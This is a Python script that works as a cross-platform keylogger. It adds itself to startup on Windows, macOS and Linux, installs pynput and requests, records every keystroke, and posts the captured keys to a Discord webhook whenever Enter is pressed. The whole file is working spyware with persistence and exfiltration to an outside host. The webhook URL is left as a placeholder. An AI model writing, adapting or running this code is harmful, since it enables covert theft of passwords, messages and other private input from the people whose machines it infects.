import os
import platform
import subprocess
import sys
import requests
from pynput import keyboard

# Function to create a startup shortcut
def create_startup_shortcut():
    try:
        script_path = os.path.abspath(__file__)
        system = platform.system()

        if system == "Windows":
            startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
            shortcut_path = os.path.join(startup_folder, "script.lnk")
            os.system(f'powershell "$ws = New-Object -ComObject WScript.Shell; $s = $ws.CreateShortcut(\'{shortcut_path}\'); $s.TargetPath = \'{script_path}\'; $s.Save()"')
            print("Shortcut created successfully.")
        elif system == "Darwin":  # macOS
            startup_folder = os.path.join(os.path.expanduser("~"), "Library", "LaunchAgents")
            plist_path = os.path.join(startup_folder, "com.example.script.plist")
            plist_content = f'''<?xml version="1.0" encoding="UTF-8"?>
            <plist version="1.0">
                <dict>
                    <key>Label</key>
                    <string>com.example.script</string>
                    <key>ProgramArguments</key>
                    <array>
                        <string>{sys.executable}</string>
                        <string>{script_path}</string>
                    </array>
                    <key>RunAtLoad</key>
                    <true/>
                </dict>
            </plist>
            '''
            with open(plist_path, "w") as plist_file:
                plist_file.write(plist_content)
            print("Shortcut created successfully.")
        elif system == "Linux":
            startup_folder = os.path.join(os.path.expanduser("~"), ".config", "autostart")
            desktop_file = os.path.join(startup_folder, "script.desktop")
            desktop_content = f'''[Desktop Entry]
            Type=Application
            Exec={sys.executable} {script_path}
            Hidden=false
            NoDisplay=false
            X-GNOME-Autostart-enabled=true
            Name[en_US]=Script
            Name=Script
            Comment[en_US]=Run script on startup
            Comment=Run script on startup
            '''
            with open(desktop_file, "w") as desktop:
                desktop.write(desktop_content)
            print("Shortcut created successfully.")
    except Exception as e:
        print(f"Failed to create startup shortcut: {e}")

# Function to install dependencies using pip
def install_dependencies():
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", "--upgrade", "pip", "setuptools", "wheel", "requests", "pynput"])
        print("Dependencies installed successfully.")
    except subprocess.CalledProcessError as e:
        print(f"Failed to install dependencies: {e}")
        sys.exit(1)

# Function to send data to the Discord webhook
def send_to_discord_webhook(webhook_url, data):
    payload = {'content': data}
    response = requests.post(webhook_url, json=payload)
    if response.status_code != 200:
        print(f"Failed to send data to Discord webhook. Status code: {response.status_code}")

# Listener for keyboard events
def on_press(key):
    logs.append(str(key))
    if key == keyboard.Key.enter:
        print("Enter key pressed, sending logs...")
        send_to_discord_webhook(webhook_url, ''.join(logs))
        logs.clear()

# Main function
def main():
    global webhook_url
    webhook_url = "YOUR DISCORD WEBHOOK HERE"

    # Create startup shortcut
    create_startup_shortcut()

    # Install dependencies
    install_dependencies()

    global logs
    logs = []

    # Start the keyboard listener
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()
